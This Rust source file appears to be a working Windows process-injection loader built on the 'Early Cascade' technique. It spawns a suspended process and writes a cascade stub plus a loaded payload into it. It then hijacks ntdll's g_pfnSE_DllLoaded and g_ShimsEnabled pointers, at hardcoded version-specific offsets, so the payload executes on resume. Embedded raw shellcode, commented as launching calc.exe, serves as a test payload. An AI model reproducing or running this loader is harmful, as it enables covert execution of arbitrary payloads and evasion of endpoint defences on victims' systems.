#![allow(non_snake_case)]

use crate::func::{self, CalculateNtdllMd5};

use noldr::{get_dll_address, get_teb};

use winapi::shared::ntdef::HANDLE as winapi_HANDLE;
use winapi::um::processthreadsapi::GetProcessId;
use std::fs::read;
use std::env;

//build paystub and extract the shellcode with paystub/extract.py -f ./target/release/paystub.exe -o loader.bin
//copy the loader.bin to the same directory as this executable
pub fn get_paystub() -> Vec<u8> {
    let args: Vec<String> = env::args().collect();
    
    if args.len() != 2 {
        eprintln!("Error: Missing loader file path");
        eprintln!("Usage: {} <path_to_loader_file>", args.get(0).unwrap_or(&String::from("program")));
        eprintln!("Example: {} loader.bin", args.get(0).unwrap_or(&String::from("program")));
        std::process::exit(1);
    }

    let loader_path = &args[1];
    match read(loader_path) {
        Ok(data) => data,
        Err(e) => {
            eprintln!("Error reading file '{}': {}", loader_path, e);
            eprintln!("Please ensure the file exists and you have permission to read it.");
            std::process::exit(1);
        }
    }
}
//this shellcode pops calc
pub const TEST_CODE: [u8; 276] = [
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
    0x65, 0x78, 0x65, 0x00,
];

pub const CASCADE_STUB: [u8; 66] = [
    0x48, 0x83, 0xec, 0x38,                    // sub rsp, 38h
    0x33, 0xc0,                                // xor eax, eax
    0x45, 0x33, 0xc9,                          // xor r9d, r9d
    0x48, 0x21, 0x44, 0x24, 0x20,             // and [rsp+38h+var_18], rax
    0x48, 0xba,                                // mov rdx,
    0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,  // 8888888888888888h
    0xa2,                                      // mov ds:[...], al
    0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,  // 9999999999999999h
    0x49, 0xb8,                                // mov r8,
    0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77,  // 7777777777777777h
    0x48, 0x8d, 0x48, 0xfe,                    // lea rcx, [rax-2]
    0x48, 0xb8,                                // mov rax,
    0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,  // 6666666666666666h
    0xff, 0xd0,                                // call rax
    0x33, 0xc0,                                // xor eax, eax
    0x48, 0x83, 0xc4, 0x38,                    // add rsp, 38h
    0xc3                                       // retn
];

#[no_mangle]
pub extern "system" fn Pick() {

    let paystub = get_paystub();

    let teb = get_teb();
    println!("teb: {:?}", teb);

    //need to add error handling
    let ntdll = get_dll_address("ntdll.dll".to_string(), teb).unwrap();
    println!("ntdll: {:?}", ntdll);

    //check the ntdll hash
    let ntdll_hash = CalculateNtdllMd5();
    let ntdll_hash_str = unsafe { std::ffi::CStr::from_ptr(ntdll_hash).to_string_lossy() };
    println!("Ntdll Hash: {}", ntdll_hash_str);

    // Set offsets based on ntdll hash
    let (g_ShimsEnabled_offset, g_pfnSE_DllLoaded_offset) = match ntdll_hash_str.as_ref() {
        "e54c7c4f01b53d2e5629871757f86a39" => (0x186CF0, 0x19B270),
        // Add more hash matches here for different ntdll versions
        _ => panic!("Unsupported ntdll version with hash: {}", ntdll_hash_str),
    };

    //if the hash is found, we calculate the locations of g_ShimsEnabled and g_pfnSE_DllLoaded
    let g_ShimsEnabled = ntdll as *mut u8 as usize + g_ShimsEnabled_offset;
    let g_pfnSE_DllLoaded = ntdll as *mut u8 as usize + g_pfnSE_DllLoaded_offset;
    println!("Calculating locations based on ntdll hash");
    //print offsets
    println!("g_ShimsEnabled_offset: 0x{:x}", g_ShimsEnabled_offset);
    println!("g_pfnSE_DllLoaded_offset: 0x{:x}", g_pfnSE_DllLoaded_offset);
    //print the calculated locations
    println!("g_ShimsEnabled: 0x{:x}", g_ShimsEnabled);
    println!("g_pfnSE_DllLoaded: 0x{:x}", g_pfnSE_DllLoaded);

    //create a suspended process
    println!("Creating suspended process");
    let handles = func::CreateSuspendedProcess(ntdll);
    let handle = handles.0;
    let thread = handles.1;
    println!("Child Process Handle: 0x{:x}", handle.0);

    //get the pid for the handle and print it
    let pid = unsafe { GetProcessId(handle.0 as *mut _) };
    println!("Child Process ID: {}", pid);

    //here we will write some shellcodes to memory, the paystub and payload.
    //TODO
    println!("Mapping Cascade Stub and Shellcode");
    
    let scbase = func::MapShellcodes(
        handle.0 as winapi_HANDLE,
        &CASCADE_STUB,
        &paystub,
        &TEST_CODE,
        ntdll,
        g_ShimsEnabled,
    );
    println!("Base address: {:x?}", scbase);

    //unsafe { func::check_memory_permissions(handle.0 as winapi_HANDLE, scbase, ntdll); }

    //now we need to overwrite g_pfnSE_DllLoaded with shellcode address and set g_ShimsEnabled to 1
    println!("Overwriting g_pfnSE_DllLoaded and g_ShimsEnabled");
    let result = func::OverwriteSE_DllLoaded(
        handle.0 as winapi_HANDLE,
        scbase,
        g_pfnSE_DllLoaded,
        g_ShimsEnabled,
        ntdll,
    );
    println!("Result: {:x?}", result);

    /* 
    //here we will pause for user input
    //i was doing this for debugging purposes
    println!("Press Enter to continue...");
    let _ = std::io::stdin().read_line(&mut String::new());
    */
    //resume the thread
    println!("Resuming thread");
    let resume_result = func::ResumeThread(thread.0 as winapi_HANDLE, ntdll);
    println!("Resume result: {:x?}", resume_result);

}
